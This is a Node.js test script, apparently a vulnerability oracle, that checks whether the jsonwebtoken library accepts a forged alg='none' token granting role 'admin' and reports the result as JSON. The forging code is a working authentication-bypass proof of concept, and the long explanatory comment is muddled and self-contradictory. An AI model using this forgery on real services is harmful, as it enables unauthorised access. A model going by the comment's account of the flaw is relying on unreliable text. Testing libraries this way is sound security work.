'use strict';
const jwt = require('jsonwebtoken');

function b64url(buf) {
  return buf.toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // The "secret" here represents a value that is NOT meant to ever be used
    // as an HMAC key by itself -- in the real-world exploited scenario this
    // would be an RSA/EC public key string that a server uses only for
    // RS256/ES256 verification. We model the vulnerability directly against
    // jwt.verify()'s historically insecure default: when no `algorithms`
    // option is supplied, the library used to derive the acceptable
    // algorithm set from the *type of the key argument* in a way that still
    // permitted callers to pass a token whose header `alg` differs from what
    // was intended, enabling 'none' algorithm style confusion variants.
    // Concretely, 8.5.1 and earlier only restrict algorithms when the caller
    // explicitly provides `options.algorithms`; absent that, the attacker can
    // supply alg: 'none' in the header and jwt.verify() will refuse it only
    // if a secret/key is given AND algorithms are not explicitly validated
    // against the key type. Patched versions enforce that an HMAC key must
    // not be used to validate asymmetric or 'none'-typed tokens when the
    // caller did not pin algorithms, and reject mismatched/forged headers.
    const secretOrKey = 'benign-shared-secret-' + marker;

    // --- Benign operation first: sign and verify normally with HS256 ---
    const benignToken = jwt.sign({ marker, role: 'user' }, secretOrKey, { algorithm: 'HS256' });
    const benignDecoded = jwt.verify(benignToken, secretOrKey);

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign HS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    operation_completed = true;

    // --- Malicious attempt: 'none' algorithm forgery ---
    // Attacker crafts a token with alg=none and an empty signature segment,
    // attempting to have jwt.verify() accept it even though a real secret was
    // supplied for verification (no `algorithms` allowlist passed by caller,
    // mirroring common real-world misuse that the CVE's insecure-default
    // concerns target).
    const forgedPayload = { marker, role: 'admin' };
    const headerB64 = b64url(Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })));
    const payloadB64 = b64url(Buffer.from(JSON.stringify(forgedPayload)));
    const forgedToken = headerB64 + '.' + payloadB64 + '.';

    try {
      const forgedDecoded = jwt.verify(forgedToken, secretOrKey);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() accepted a forged alg=none token without signature verification, decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged none-alg token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      exploit_succeeded = false;
      evidence = 'Forged alg=none token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
